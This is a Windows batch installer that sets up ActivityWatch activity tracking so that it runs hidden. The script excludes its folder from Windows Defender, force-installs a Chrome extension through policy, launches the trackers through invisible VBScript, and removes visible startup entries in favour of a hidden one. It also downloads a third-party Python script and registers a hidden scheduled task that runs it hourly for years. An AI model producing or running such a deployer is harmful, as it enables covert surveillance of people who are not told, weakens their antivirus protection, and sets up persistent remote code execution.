@echo off
echo Starting ActivityWatch Master Installation...

:: Add Windows Defender Exclusion automatically (Requires Admin)
echo Configuring Windows Defender...
powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\.aw_tracker'" >nul 2>&1

:: Windows Chrome Policy
echo Setting up Chrome Extension...
reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "nglaklhklhcoonedhgnpgddginnjdadi;https://clients2.google.com/service/update2/crx" /f

:: Download and extract ActivityWatch for Windows
echo Downloading ActivityWatch...
mkdir "%USERPROFILE%\.aw_tracker" 2>nul
if not exist "%USERPROFILE%\.aw_tracker\activitywatch\aw-server\aw-server.exe" (
    curl.exe -L -o "%TEMP%\aw-win.zip" "https://github.com/ActivityWatch/activitywatch/releases/download/v0.13.2/activitywatch-v0.13.2-windows-x86_64.zip"
    tar.exe -xf "%TEMP%\aw-win.zip" -C "%USERPROFILE%\.aw_tracker"
) else (
    echo ActivityWatch engine already installed. Skipping download.
)

:: Install Visual C++ Redistributable silently (Required for aw-server-rust)
if not exist "C:\Windows\System32\vcruntime140.dll" (
    echo Checking/Installing Visual C++ Redistributable...
    curl.exe -sSL -o "%TEMP%\vc_redist.x64.exe" "https://aka.ms/vs/17/release/vc_redist.x64.exe"
    "%TEMP%\vc_redist.x64.exe" /install /quiet /norestart
    del "%TEMP%\vc_redist.x64.exe"
)

:: Create a VBScript to run trackers completely invisibly (no black windows)
echo Set WshShell = CreateObject("WScript.Shell") > "%USERPROFILE%\.aw_tracker\start_aw.vbs"
echo WshShell.Run chr(34) ^& "%USERPROFILE%\.aw_tracker\activitywatch\aw-server-rust\aw-server-rust.exe" ^& Chr(34), 0 >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
echo WshShell.Run chr(34) ^& "%USERPROFILE%\.aw_tracker\activitywatch\aw-watcher-afk\aw-watcher-afk.exe" ^& Chr(34), 0 >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
echo WshShell.Run chr(34) ^& "%USERPROFILE%\.aw_tracker\activitywatch\aw-watcher-window\aw-watcher-window.exe" ^& Chr(34), 0 >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
echo Set WshShell = Nothing >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"

:: Run the VBScript now
wscript.exe "%USERPROFILE%\.aw_tracker\start_aw.vbs"

:: Clean up any old visible registry keys so they don't pop up on boot
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AW-Server" /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AW-Watcher-AFK" /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AW-Watcher-Window" /f >nul 2>&1

:: Set auto-start on boot to run the invisible VBScript
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ActivityWatchHidden" /t REG_EXPAND_SZ /d "wscript.exe \"%USERPROFILE%\.aw_tracker\start_aw.vbs\"" /f

:: Set up Python Tracker
echo Setting up Python Tracker...
mkdir "%USERPROFILE%\.aw_tracker" 2>nul
curl.exe -sSL -o "%USERPROFILE%\.aw_tracker\activity_tracker.py" "https://raw.githubusercontent.com/SamaOps/ActivityWatch/main/activity_tracker.py"

:: Install Python silently if missing
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python not found. Installing Python 3.11 silently (this may take a minute)...
    curl.exe -sSL -o "%TEMP%\python_installer.exe" "https://www.python.org/ftp/python/3.11.8/python-3.11.8-amd64.exe"
    "%TEMP%\python_installer.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 Include_doc=0
    del "%TEMP%\python_installer.exe"
    :: Give Windows a moment to register the new PATH variables
    timeout /t 3 /nobreak >nul
)

:: Schedule the python script to run silently every hour, even on battery power
echo CreateObject("WScript.Shell").Run "pythonw """ ^& "%USERPROFILE%\.aw_tracker\activity_tracker.py" ^& """", 0, False > "%USERPROFILE%\.aw_tracker\run_hidden_task.vbs"
powershell -Command "$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '\"%USERPROFILE%\.aw_tracker\run_hidden_task.vbs\"'; $t1 = New-ScheduledTaskTrigger -AtLogOn; $t2 = New-ScheduledTaskTrigger -Once -At '00:00' -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 3650); $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden; Register-ScheduledTask -Action $action -Trigger @($t1, $t2) -Settings $settings -TaskName 'ActivityWatchTracker' -Force" >nul

echo Installation Complete! Chrome extension and ActivityWatch are now running silently.
echo Triggering first background sync (will execute within 0-5 minutes)...
schtasks /run /tn "ActivityWatchTracker" >nul 2>&1
